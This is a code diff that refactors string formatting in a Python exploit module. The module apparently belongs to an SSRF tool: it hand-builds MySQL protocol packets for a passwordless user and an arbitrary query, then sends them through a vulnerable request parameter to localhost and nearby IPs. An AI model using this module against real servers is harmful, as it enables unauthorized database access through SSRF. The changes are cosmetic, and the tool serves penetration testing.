@@ -23,14 +23,14 @@ class exploit():
 
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         # Encode the username for the request
         self.user = input("Give MySQL username: ")
         encode_user = binascii.hexlify( self.user.encode() )
         user_length = len(self.user)
         temp   = user_length - 4
-        length = '{:x}'.format(0xa3 + temp)
+        length = f'{(0xa3 + temp):x}'
 
         # Authenticate to MySQL service - only work with users allowed without password
         dump  = length+ "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
@@ -67,7 +67,7 @@ class exploit():
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
             payload = self.get_payload(self.query, auth, ip)
-            logging.info("Generated payload : {}".format(payload))
+            logging.info(f"Generated payload : {payload}")
 
             r1 = requester.do_request(args.param, payload)
             r2 = requester.do_request(args.param, "")
@@ -83,10 +83,10 @@ class exploit():
 
     def get_payload(self, query, auth, ip):
         if(query.strip()!=''):
-        	query = binascii.hexlify( query.encode() )
-        	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
-        	pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
-        	final = self.encode(auth + pay1 + "0100000001", ip)
-        	return final
+            query = binascii.hexlify( query.encode() )
+            query_length = f'{(int((len(query) / 2) + 1)):x}'
+            pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
+            final = self.encode(auth + pay1 + "0100000001", ip)
+            return final
         else:
-    	    return self.encode(auth, ip)
+            return self.encode(auth, ip)
